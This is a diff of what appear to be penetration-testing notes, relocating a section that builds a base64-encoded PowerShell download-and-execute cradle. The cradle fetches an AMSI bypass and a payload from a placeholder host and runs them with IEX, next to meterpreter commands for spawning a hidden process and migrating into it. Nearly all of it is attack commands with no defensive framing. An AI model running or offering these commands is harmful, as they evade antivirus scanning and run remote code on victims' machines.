@@ -79,17 +79,6 @@ $EncodedText = [Convert]::ToBase64String($bytes)
 $EncodedText
 ```
 
-To include the AMSI bypass (this may need to be executed a couple of times):
-
-```bash
-pwsh  
-$text = "(new-object system.net.webclient).downloadstring('http://x.x.x.x/amsi.txt') | IEX; (new-object system.net.webclient).downloadstring('http://x.x.x.x/run.txt') | IEX"  
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)  
-$EncodedText = [Convert]::ToBase64String($bytes)  
-$EncodedText
-
-```
-
 Send this to the target:
 
 ```bash
@@ -103,3 +92,13 @@ meterpreter > execute -H -f notepad
 meterpreter > migrate 620 
 ```
 
+To include the AMSI bypass (this may need to be executed a couple of times):
+
+```bash
+pwsh  
+$text = "(new-object system.net.webclient).downloadstring('http://x.x.x.x/amsi.txt') | IEX; (new-object system.net.webclient).downloadstring('http://x.x.x.x/run.txt') | IEX"  
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)  
+$EncodedText = [Convert]::ToBase64String($bytes)  
+$EncodedText
+
+```
